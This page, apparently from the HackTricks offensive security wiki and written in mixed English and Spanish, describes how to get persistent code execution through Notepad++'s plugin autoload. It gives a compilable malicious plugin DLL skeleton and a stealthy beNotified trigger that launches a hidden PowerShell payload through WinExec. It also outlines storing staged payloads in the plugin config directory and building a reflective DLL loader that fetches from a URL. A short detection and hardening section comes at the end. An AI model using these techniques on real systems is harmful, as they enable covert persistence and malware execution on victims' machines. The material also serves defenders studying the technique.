# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **autoload** every plugin DLL found under its `plugins` subfolders on launch. Dropping a malicious plugin into any **writable Notepad++ installation** gives code execution inside `notepad++.exe` every time the editor starts, which can be abused for **persistence**, stealthy **initial execution**, or as an **in-process loader** if the editor is launched elevated.

Since **Notepad++ 7.6+** the expected manual-install layout is **one subfolder per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presence of `doLocalConf.xml` next to `notepad++.exe`), the whole application tree stays local to that directory, which often turns copied/admin tool bundles into an easy user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (usually requires admin to write).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** in a user-writable folder.
- Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
- Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Puntos de carga del plugin (primitive execution)
Notepad++ espera funciones **exportadas** específicas. Todas se llaman durante la inicialización, lo que da múltiples superficies de ejecución:
- **`DllMain`** — se ejecuta inmediatamente al cargar la DLL (primer punto de ejecución).
- **`setInfo(NppData)`** — se llama una vez al cargar para proporcionar los handles de Notepad++; lugar típico para registrar elementos del menú.
- **`getName()`** — devuelve el nombre del plugin mostrado en el menú.
- **`getFuncsArray(int *nbF)`** — devuelve los comandos del menú; incluso si está vacío, se llama durante el arranque.
- **`beNotified(SCNotification*)`** — recibe eventos de Notepad++ / Scintilla (útil para posponer payloads hasta una acción del usuario o un evento del editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manejador de mensajes, útil para intercambios de datos más grandes.
- **`isUnicode()`** — bandera de compatibilidad verificada al cargar.

La mayoría de las exports pueden implementarse como **stubs**; la ejecución puede ocurrir desde `DllMain` o cualquier callback anterior durante autoload.

## Esqueleto mínimo de plugin malicious
Compila una DLL con las exports esperadas y colócala en `plugins\\MyNewPlugin\\MyNewPlugin.dll` dentro de una carpeta de Notepad++ escribible:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compila la DLL (Visual Studio/MinGW).
2. Crea la subcarpeta del plugin dentro de `plugins` y copia la DLL allí.
3. Reinicia Notepad++; la DLL se carga automáticamente, ejecutando `DllMain` y las callbacks posteriores.

## Patrón de activación de bajo ruido mediante `beNotified`
Para OPSEC, muchos payloads **no** deberían ejecutarse desde `DllMain`. Un patrón más silencioso es permitir que el plugin se cargue correctamente y luego ejecutar solo después de un evento realista del editor, como **startup complete**, **buffer activation** o el **primer carácter escrito**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Esto encaja mejor con la investigación ofensiva pública que un ruidoso beacon `DllMain`: la DLL sigue cargándose automáticamente al inicio, pero la acción maliciosa se retrasa hasta que Notepad++ parece estar realmente en uso.

## Using the plugin config directory as secondary storage
Notepad++ expone `NPPM_GETPLUGINSCONFIGDIR`, que devuelve el **directorio de configuración de plugins del usuario actual**. Un plugin malicioso puede usar esto para mantener la DLL en disco mínima mientras almacena config cifrada, payloads staged o archivos de tasking en una ruta que se integra con el estado normal del plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationalmente esto es útil cuando quieres:
- un pequeño bootstrap DLL autoloaded;
- tasking por usuario sin tocar de nuevo el binario principal del plugin;
- separar el **autoload trigger** de la segunda etapa más pesada.

## Reflective loader plugin pattern
Un plugin weaponized puede convertir Notepad++ en un **reflective DLL loader**:
- Presentar una UI/entrada de menú mínima (por ejemplo, "LoadDLL").
- Aceptar una **file path** o **URL** para obtener un payload DLL.
- Mapear reflectively el DLL en el proceso actual e invocar un punto de entrada exportado (por ejemplo, una función loader dentro del DLL obtenido).
- Beneficio: reutilizar un proceso GUI de aspecto benigno en lugar de iniciar un nuevo loader; el payload hereda la integridad de `notepad++.exe` (incluidos contextos elevados).
- Trade-offs: dejar caer un **unsigned plugin DLL** en disco es ruidoso; una variante práctica es usar el plugin autoloaded solo como un stub y mantener el implant real cifrado/staged en otro lugar.

## Detection and hardening notes
- Bloquear o monitorizar **writes to Notepad++ plugin directories** (incluidas copias portables en perfiles de usuario); habilitar controlled folder access o application allowlisting.
- Alertar sobre **new unsigned DLLs** bajo `plugins`, cambios en árboles portables de Notepad++ y **child processes/network activity** inusual desde `notepad++.exe`.
- Establecer una baseline de plugins legítimos e investigar cualquier nuevo DLL que exporte la interfaz normal de plugin de Notepad++ pero también lance shells, PowerShell o network beacons.
- Imponer la instalación de plugins solo mediante **Plugins Admin**, y restringir la ejecución de copias portables desde rutas no confiables.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
